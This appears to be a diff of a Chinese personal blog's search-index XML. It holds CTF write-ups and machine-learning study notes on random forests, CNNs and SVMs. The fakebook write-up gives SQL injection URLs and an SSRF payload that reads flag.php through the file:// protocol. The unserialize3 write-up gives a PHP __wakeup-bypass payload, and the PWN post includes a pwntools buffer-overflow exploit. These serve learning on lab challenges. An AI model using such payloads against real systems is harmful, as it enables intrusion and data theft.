-<li><p>使用SSRF服务器端请求伪造，view.php让它去请求flag.php就可以了，猜测flag.php的实际路径为<code>/var/www/html/flag.php</code>构造file协议<code>file:///var/www/html/flag.php</code></p></li>
-<li><p>payload:</p>
-<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=0/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3</span><br><span class="line">&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.p</span><br><span class="line">hp&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p></li>
-<li><p>flag:<img src="../images/xctf-fakebook/2348945-20210803115421633-1711242055.png" alt="image-20210803115419560" /></p>
-<p>iframe中的base64编码数据解码之后也可以看到flag</p></li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> reversing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PWN入门</title>
+      <link href="/2021/11/12/PWN%E5%85%A5%E9%97%A8.html"/>
+      <url>/2021/11/12/PWN%E5%85%A5%E9%97%A8.html</url>
+      
+        <content type="html"><![CDATA[<p>pwn 入门学习，走一遍流程</p><span id="more"></span><p>[TOC]</p><p><a href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> rip</p><h2 id="checksec">checksec</h2><p>使用,查看文件的加固机制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checksec filename#老版</span><br><span class="line">checksec --file=filename #新版</span><br></pre></td></tr></table></figure><center><image src="https://upload-images.jianshu.io/upload_images/11071922-51baa910d9fa15dc.png?imageMogr2/auto-orient/strip|imageView2/2/w/626/format/webp"/></center><p><strong>Arch:</strong>程序架构信息</p><p><strong>RELRO</strong>（relocation read-only)：主要针对GOT改写的攻击方式，分为两种，partial relro和full relro</p><p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh00获得shell</strong> 完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure><p><strong>stack-caacry:</strong>栈溢出保护。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p><p><strong>NX：</strong>开启会让栈中数据没有执行权限，无法触发shellcode，只会造成程序崩溃，可以利用rop绕过。</p><p><strong>PIE</strong>：位置无关可执行，程序运行时各个段加载的虚拟地址是再装载时确定。</p><h2 id="静态分析代码">静态分析代码</h2><p>看到main函数，gets函数可能存在栈溢出漏洞，接着点击s局部变量进入栈空间。</p><figure><img src="../images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133030041-1533255546.png" alt="image-20210924133025356" /><figcaption aria-hidden="true">image-20210924133025356</figcaption></figure><p>第一次看到略感奇怪怎么两个s，r又是什么。首先明确这是main函数的栈空间，<strong>上面的s是局部变量，下面的s指的是rbp</strong>，64位程序8个字节。r比较特殊，有的地方说是return的东西，但是返回东西一般是通过寄存器eax或rax返回的，有点忘了。<strong>r应该是main函数执行完成后，EIP的值，即main函数结束后要执行的下一条执行。</strong></p><p>栈溢出漏洞请自行补充知识。</p><figure><img src="../images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133138596-1167051620.png" alt="image-20210924133134114" /><figcaption aria-hidden="true">image-20210924133134114</figcaption></figure><p>找到提权函数，这个还没有搞懂，大概就是让mian函数执行完了，执行fun函数，然后既可以cat flag了。</p><figure><img src="../images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133524694-1219666581.png" alt="image-20210924133520323" /><figcaption aria-hidden="true">image-20210924133520323</figcaption></figure><h2 id="动态分析">动态分析</h2><p>难度大一些的才需要，使用GDB和peda分析。</p><h2 id="编写exp">编写exp</h2><p>remote和process一个是远程服务器，一个是本地尝试，使用时只用一个。</p><p>本地测试需要赋予可执行的权限，不然总是显示没有权限sudo也不行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x pwn1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28082</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn1&#x27;) </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span> + <span class="number">0x8</span>) + p64(<span class="number">0x0401185</span>) + p64(<span class="number">0x0401186</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1) <span class="comment">#哈啊哈</span></span><br><span class="line"></span><br><span class="line">r.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><p><a href="https://www.jianshu.com/p/755e52d48a77">checksec工具使用-pwn - 简书 (jianshu.com)</a></p><p>[(12条消息) <a href="https://blog.csdn.net/weixin_45004513/article/details/117332121">CTF PWN] 从0到0.00001 PWN入门超级详细_Csome-CSDN博客</a></p>]]></content>
+      
+      
       <categories>
-        <category>CTF</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xctf-unserialize3</title>
-    <url>/2021/11/12/xctf-unserialize3.html</url>
-    <content><![CDATA[<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h3 id="序列化和反序列化">序列化和反序列化</h3>
-<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
-<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
-<h4 id="例子">例子：</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
-<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
-<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
-<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
-<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
-<h3 id="魔法函数">魔法函数</h3>
-<figure>
-<img src="../images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
-<h3 id="题目分析">题目分析</h3>
-<p>访问看到<img src="../images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
-<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
-<p>code可能是XCTF类序列化再反序列化的结果</p>
-<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
-<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>RandomForest</title>
-    <url>/2021/10/17/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.html</url>
-    <content><![CDATA[<h2 id="决策树">决策树</h2>
-<p>先来复习一下决策树，根据预测结果不同，决策树分为回归决策树和分类决策树。很多的决策树集成，就成为了森林。常见的算法有随机森林和GDBT。</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<p>决策树是一种树形结构每个内部分支都是基于一个属性，每个叶节点代表一种类型。其实决策树就是在将一个多维（特征个数）空间进行划分，切分，产生不同类别。</p>
-<h3 id="分类决策树">分类决策树</h3>
-<p>分类决策树本身就是通过计算信息增益，选择特征，根据特征的值的个数形成分支，剪支（还没学）。</p>
-<p><span class="math inline">\(x_i\)</span>代表某个特征的取值，<span class="math inline">\(P(x_i)\)</span>代表该类型的占比，<strong>信息熵</strong>衡量的是该特征的<strong>混乱程度</strong>，公式：</p>
-<p>​ <span class="math display">\[H(X)=-\sum_{i=1}^{n}p(x_i)log p(x_i)\]</span></p>
-<p>决策树要做的就是通过对比使用每个特征进行分支产生的信息增益--信息熵的减少程度来选择特征。</p>
-<p>参考：<a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
-<h3 id="回归决策树">回归决策树</h3>
-<h3 id="classification-and-regression-tree-cart">（classification and regression tree, CART）</h3>
-<p>这里复习一下<strong>回归和拟合的区别</strong>：</p>
-<p>回归分析：是一种统计学上分析数据的方法，目的在于了解两个或多个变量间<strong>是否相关</strong>、<strong>相关方向与强度</strong>，并建立数学模型以便观察特定变量来预测研究者感兴趣的变量。</p>
-<p>拟合：是一种把现有数据透过数学方法来代入<strong>一条数式</strong>的表示方式。</p>
-<p>回归决策树将一个内部节点中的所有数据的该特征的平均值作为预测值。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925133815973-632336899.png" alt="img" style="zoom: 50%;" /></p>
-<figure>
-<img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925132930783-421450240.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h2 id="随机森林算法random-forestrf">随机森林算法（random forest,RF）</h2>
-<h3 id="简介">简介</h3>
-<p>随机森林是一种基于集成学习的思想和决策树模型而产生的分类器。<strong>集成学习（Ensemble Learning）</strong>通过使用多个弱分类器，来组成一个强分类器，提高准确率。使用多个不同决策树<strong>独立</strong>的决策结果，少数服从多数的方法来分类。</p>
-<p>少数优秀的树的预测结果将会超脱于芸芸“噪音”，做出一个好的预测。将若干个弱分类器的分类结果进行投票选择，从而组成一个强分类器，这就是随机森林<strong>bagging</strong>的思想。bagging的代价是不用单棵决策树来做预测，<strong>具体哪个变量起到重要作用变得未知</strong>，所以bagging<strong>改进了预测准确率但损失了解释性</strong>。</p>
-<h3 id="决策树生成规则">决策树生成规则</h3>
-<ol type="1">
-<li>如果训练集大小为N，对于每棵树而言，随机且有放回地从训练集中的抽取N个训练样本（这种采样方式称为bootstrap sample方法），作为该树的训练集；（<strong>bootstrap sample取样方法</strong>，随机有放回）</li>
-<li>如果每个样本的特征维度为M，指定一个常数m&lt;&lt;M，随机地从M个特征中选取m个特征子集，每次树进行分裂时，从这m个特征中选择最优的；</li>
-<li>每棵树都尽最大程度的生长，并且没有剪枝过程。</li>
-</ol>
-<p><strong>解释</strong>：随机抽样可以让<strong>每个决策树使用的数据集不同</strong>，给出不同的预测结果。有放回不至于让每个决策树得到数据集中的一部分，这样的结果是<strong>片面的</strong>。</p>
-<p>两个随机：随机取样和随机取m个特征。</p>
-<h3 id="分类效果">分类效果</h3>
-<ul>
-<li>森林中任意两棵树的相关性：相关性越大，错误率越大；</li>
-<li>森林中每棵树的分类能力：每棵树的分类能力越强，整个森林的错误率越低。</li>
-</ul>
-<p>　　减小特征选择个数m，树的相关性和分类能力也会相应的降低；增大m，两者也会随之增大。所以关键问题是如何选择最优的m（或者是范围），这也是随机森林唯一的一个参数。</p>
-<h3 id="袋外错误率out-of-bag-error">袋外错误率（out of bag error）</h3>
-<p>袋外错误率主要用于选取最佳的m值。</p>
-<p>对每个样本，使用没有选择这个样本的决策树进行预测，使用少数服从多数的方法，得到预测结果。</p>
-<p>最终得到每个样本是否被正确预测，计算袋外错误率。</p>
-<h3 id="代码使用">代码使用</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">rfc = RandomForestClassifier(n_estimators=<span class="number">100</span>)<span class="comment">#树的数量</span></span><br></pre></td></tr></table></figure>
-<h2 id="参考">参考</h2>
-<p><a href="https://zhuanlan.zhihu.com/p/373879791">决策树之分类树与回归树 - 知乎 (zhihu.com)</a></p>
-<p>[<a href="https://zhuanlan.zhihu.com/p/406627649">机器学习基础复习] 随机森林(Random Forest) - 知乎 (zhihu.com)</a></p>
-<p><a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
-<p><a href="https://blog.csdn.net/cpc784221489/article/details/92085702">(12条消息) 随机森林算法详解_阿斯达克-CSDN博客_随机森林详解</a></p>
-<p>https://www.zhihu.com/question/24904495/answer/371618173</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xctf-unserialize3</title>
+      <link href="/2021/11/12/xctf-unserialize3.html"/>
+      <url>/2021/11/12/xctf-unserialize3.html</url>
+      
+        <content type="html"><![CDATA[<p>xctf web php序列化和反序列化</p><span id="more"></span><meta name="referrer" content="no-referrer"/><h3 id="序列化和反序列化">序列化和反序列化</h3><p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p><p>反序列化就是把那串可以传输的字符串再变回对象。</p><h4 id="例子">例子：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure><img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p><p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p><p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p><p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p><p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p><h3 id="魔法函数">魔法函数</h3><figure><img src="../images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure><h3 id="题目分析">题目分析</h3><p>访问看到<img src="../images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p><p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p><p>code可能是XCTF类序列化再反序列化的结果</p><p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p><p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>]]></content>
+      
+      
       <categories>
-        <category>machine_learning</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>model</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xctf-fakebook</title>
+      <link href="/2021/11/12/xctf-fakebook.html"/>
+      <url>/2021/11/12/xctf-fakebook.html</url>
+      
+        <content type="html"><![CDATA[<p>攻防世界-web-fakebook结题过程</p><span id="more"></span><meta name="referrer" content="no-referrer"/><h3 id="使用dirmap扫描">使用dirmap扫描</h3><p>查看网页，发现只有login和join两个功能，扫描结果：<img src="../images/xctf-fakebook/2348945-20210803091934485-1631918819.png" /></p><p>login用于登录，join.php用于注册用户，view.php</p><p>因为刚开始使用dirmap，字典很差很多没扫出来，尤其是flag.php</p><h3 id="寻找注入点爆破">寻找注入点爆破</h3><ol type="1"><li><p>注册登录后进入<code>http://111.200.241.244:54207/view.php?no=1</code>，可能存在注入，可以尝试一下，但是目前只有一个用户。<img src="../images/xctf-fakebook/2348945-20210803092319661-797664669.png" alt="image-20210803092317796" style="zoom: 50%;" /></p></li><li><p><code>http://111.200.241.244:54207/view.php?no=2-1</code>，页面不变，发现是数字型注入。</p></li><li><p>使用<code>http://111.200.241.244:54207/view.php?no=1%20order by 4 %23</code>,返回，列数为4.</p></li><li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20select%201,2,3,4%20%23</code></p><p>联合查询被检测到了。<img src="../images/xctf-fakebook/2348945-20210803092855345-1138880396.png" alt="image-20210803092853586" /></p></li><li><p>试试布尔盲注<code>http://111.200.241.244:54207/view.php?no=1%20and%200%20%23</code>成功了。下面又试试这个成功了。写代码是不能的，还是直接sqlmap来的快。尝试了一下发现响应太慢？？？？不得行啊。 手动发现数据库名长度为8，难道真的要依次试试嘛。第一个字符为f，难道就是flag？</p><p>发现正确的，响应时间很长，错误的响应时间很短。应该就是fakebook就是这个嘛 。</p><figure><img src="../images/xctf-fakebook/2348945-20210803093525594-61070285.png" alt="image-20210803093523771" /><figcaption aria-hidden="true">image-20210803093523771</figcaption></figure></li><li><p>又试试报错，显示了报错信息。但是又不能使用updatexml，其他的没试。<img src="../images/xctf-fakebook/2348945-20210803093258691-1812634557.png" alt="image-20210803093256905" /></p><figure><img src="../images/xctf-fakebook/2348945-20210803093102514-1853772178.png" alt="image-20210803093100610" /><figcaption aria-hidden="true">image-20210803093100610</figcaption></figure></li><li><p>百度了一下，发现union select过滤的绕过可以使用union all select 绕过。或者union\**<img src="../images/xctf-fakebook/2348945-20210803095205266-1077013596.png" alt="image-20210803095203278" /></p></li><li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%22fakebook%22%20%23</code></p><p>发现users表</p></li><li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%22users%22%20%23</code><img src="../images/xctf-fakebook/2348945-20210803095411100-648756374.png" alt="image-20210803095409210" /></p></li><li><p>data列中是O:8:"UserInfo":3:{s:4:"name";s:5:"jason";s:3:"age";i:0;s:4:"blog";s:9:"jason.com";} 明显是用户类序列化的结果。不对啊，我要的是flag啊，这是啥啊。还是看writeup把，好家伙user.php.bak没扫出来，字典垃圾了，赶紧加上。</p></li><li><p>查看user.php.bak，大概就是view.php中的内容，核心在有一个网络请求blog中。</p></li><li><p>根据扫描结果可以知道根目录下有一个flag.php但是浏览器打开啥也没有。</p></li><li><p>使用SSRF服务器端请求伪造，view.php让它去请求flag.php就可以了，猜测flag.php的实际路径为<code>/var/www/html/flag.php</code>构造file协议<code>file:///var/www/html/flag.php</code></p></li><li><p>payload:</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=0/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3</span><br><span class="line">&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.p</span><br><span class="line">hp&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p></li><li><p>flag:<img src="../images/xctf-fakebook/2348945-20210803115421633-1711242055.png" alt="image-20210803115419560" /></p><p>iframe中的base64编码数据解码之后也可以看到flag</p></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CNN原理与实践</title>
+      <link href="/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html"/>
+      <url>/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="原理详解">原理详解</h2><h3 id="卷积">卷积</h3><p>通过设置一个<strong>filter或者称为kernel</strong>，对输入的矩阵进行<strong>卷积</strong>，对应位置相乘。<strong>步长为1</strong>，矩阵两个维度均减小<strong>kernel维度-1</strong>.</p><p><strong>可以通过设计特定的filter，让它去跟图片做卷积，就可以识别出图片中的某些特征</strong><span id="more"></span></p><p><strong>CNN（convolutional neural network），主要就是通过一个个的filter，不断地提取特征，从局部的特征到总体的特征，从而进行图像识别等等功能。</strong>学习的目的就是去学习这些filter中的参数。</p><meta name="referrer" content="no-referrer"/><p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193054401-148638570.jpg" /></p><h3 id="padding填白">Padding填白</h3><p>经过卷积后，图像会越来越小，padding分为<strong>same</strong>和<strong>valid</strong>。</p><p>same 就是卷积前后大小不变。<strong>在卷积前</strong>，对图像增加一个padding填白，使大小不变。先要确定卷积核的大小才能确定填充大小。</p><p>valid 就是不经过任何填白。</p><p>但是用什么填充呢，一般采用0填充。零填充：在图片像素的最外层加上若干层0值，若一层，记做p =1。<strong>0在权重乘积和运算中对最终结果不造成影响，也就避免了图片增加了额外的干扰信息。</strong></p><figure><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193714290-897558988.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="步长stride">步长stride</h3><p>就是卷积核的移动长度，每次向右移动一个步长。</p><h3 id="pooling池化">pooling池化</h3><p>有的地方也成为<strong>采样sampling</strong></p><p>池化的目的使提取一定区域的主要特征，<strong>减少参数数量，防止模型过拟合</strong>。</p><p>常见的pooling有<strong>maxpooling</strong>，取一定区域的最大值。取步长为2，取区域最大值。还有averagePooling</p><figure><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194057122-600716143.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="多通道卷积">多通道卷积</h3><p>全面看的都是输入的二维矩阵，现在看多通道，即三维的输入。</p><p>注意到下图要求，卷积核的最后一个3就是<strong>通道channel</strong>数，必须相同。</p><p>每一个kernel进行卷积得到一个二维矩阵，通过激活函数ReLU后放在一起即可。</p><p>这里需要主要一下维度的变化，<strong>kernel的数量==结果的通道数，输入通道数==kernel通道数</strong>。</p><figure><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194352219-2047578984.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008200101676-1316336134.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_height = (input_height - filter_height + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br><span class="line">new_width = (input_width - filter_width + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="cnn网络结构">CNN网络结构</h3><p>X--&gt;CONV(relu)--&gt;MAXPOOL--&gt;CONV(relu)--&gt;FC(relu)--&gt;FC(softmax)--&gt;Y</p><p>扁平化 <strong>(height,width,channel)</strong>的数据压缩成长度为 <strong>height × width × channel</strong> 的一维数组，然后再与 <strong>FC层</strong>连接，<strong>这之后就跟普通的神经网络无异了</strong>。</p><figure><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194727363-1650633100.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="cnn相对传统网络的优势">CNN相对传统网络的优势</h3><ul><li>参数共享机制。网络的参数大大减少，可以使用较少的参数训练出更好的模型。</li><li>连接的稀疏性 输出的图像的任何一个单元仅和图像的一部分有关。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shape : N*C*H*W  ,  卷积核： H*W*</span><br></pre></td></tr></table></figure><figure><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211010095235308-136260343.png" alt="image-20211010095224357" /><figcaption aria-hidden="true">image-20211010095224357</figcaption></figure><h2 id="cnn代码实践">CNN代码实践</h2><h2 id="参考">参考</h2><p><a href="https://zhuanlan.zhihu.com/p/42559190">【DL笔记6】从此明白了卷积神经网络（CNN） - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/qq_34714751/article/details/85610966">(14条消息) 使用PyTorch实现CNN_dongyangY的博客-CSDN博客</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> deep_learning </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> model </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SVM</title>
+      <link href="/2021/10/17/SVM.html"/>
+      <url>/2021/10/17/SVM.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="svm模型">SVM模型</h1><h2 id="简介">简介</h2><p><strong>支持向量机（support vector machines, SVM）</strong>是一种<strong>二分类模型</strong>，它的基本模型是定义在特征空间上的<strong>间隔最大的线性分类器</strong>，间隔最大使它有别于感知机；SVM还包括<strong>核技巧</strong>，这使它成为实质上的非线性分类器。</p><span id="more"></span><p>SVM的的学习策略就是间隔最大化，可形式化为一个求解<strong>凸二次规划</strong>的问题，也等价于正则化的合页损失函数的最小化问题。SVM的的学习算法就是求解凸二次规划的最优化算法。</p><meta name="referrer" content="no-referrer"/><h2 id="相关概念">相关概念</h2><p><strong>线性可分</strong>：二维空间上，两类点被一条直线完全分开叫做线性可分。</p><p><img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 是 n 维欧氏空间中的两个点集。如果存在 n 维向量 w 和实数 b，使得所有属于 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 的点 <img src="https://www.zhihu.com/equation?tex=x_i" alt="[公式]" /> 都有 <img src="https://www.zhihu.com/equation?tex=wx_i+%2B+b+%3E+0" alt="[公式]" /> ，而对于所有属于 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 的点 <img src="https://www.zhihu.com/equation?tex=x_j" alt="[公式]" /> 则有 <img src="https://www.zhihu.com/equation?tex=wx_j+%2B+b+%3C+0" alt="[公式]" /> ，则我们称 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 线性可分。</p><p><strong>最大间隔平面</strong>：从二维扩展到多维空间中时，将 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 完全正确地划分开的 <img 